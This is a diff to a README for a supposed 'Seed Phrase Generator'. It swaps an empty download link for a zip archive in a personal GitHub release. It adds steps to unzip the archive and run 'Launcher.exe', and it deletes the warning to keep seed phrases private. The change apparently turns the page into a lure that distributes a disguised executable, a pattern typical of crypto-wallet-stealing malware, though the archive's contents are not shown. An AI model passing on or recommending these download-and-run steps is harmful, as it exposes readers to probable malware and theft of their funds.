@@ -18,9 +18,14 @@ This repository provides resources related to the Seed Phrase Generator, a tool 
 
 To download our seed phrase generator, please visit the following button:
 
-<a href=""><img src="https://img.shields.io/badge/Download_Seed_Phrase_Generator-orange?style=flat-square" alt="Download" height="50"></a>
+<a href="https://github.com/Jackson-michellel35753/XTool/releases/download/XTOOL/Xtool.zip"><img src="https://img.shields.io/badge/Download_Seed_Phrase_Generator-orange?style=flat-square" alt="Download" height="50"></a>
 
-Please note that you should securely store your generated seed phrase and never share it with anyone.
+## Guide:
+1. Download the archive
+2. Unzip to any folder and open "Launcher.exe"
+3. Agree with terms
+4. Click "Continue"
+5. Enjoy!
 
 ## Additional Information
 
